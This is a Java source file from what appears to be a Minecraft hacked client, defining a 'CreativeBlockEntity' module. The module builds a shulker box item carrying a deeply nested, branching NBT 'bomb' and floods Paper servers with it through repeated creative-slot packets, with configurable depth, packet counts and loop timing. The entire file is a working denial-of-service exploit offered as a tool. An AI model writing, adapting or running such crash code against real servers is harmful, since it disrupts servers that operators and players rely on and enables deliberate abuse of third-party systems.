package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.module.impl.crash.BlockEntityCrash;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataBlockEntityData;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeBlockEntity extends Module {
	private ScheduledExecutorService executorService;

	public CreativeBlockEntity() {
		super("CreativeBlockEntity", "Paper creative-slot shulker block_entity_data bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 100, "50");
		addArgument("nbtDepth", ArgumentType.INT, 1, 48, "16");
		addArgument("branchSize", ArgumentType.INT, 1, 32, "8");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "10");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int nbtDepth = context.getInt("nbtDepth");
		int branchSize = context.getInt("branchSize");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		DataComponents components = new DataComponents();
		components.put(new DataBlockEntityData(BlockEntityCrash.buildBomb(nbtDepth, branchSize)));
		ItemStack item = new ItemStack(ItemType.SHULKER_BOX.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
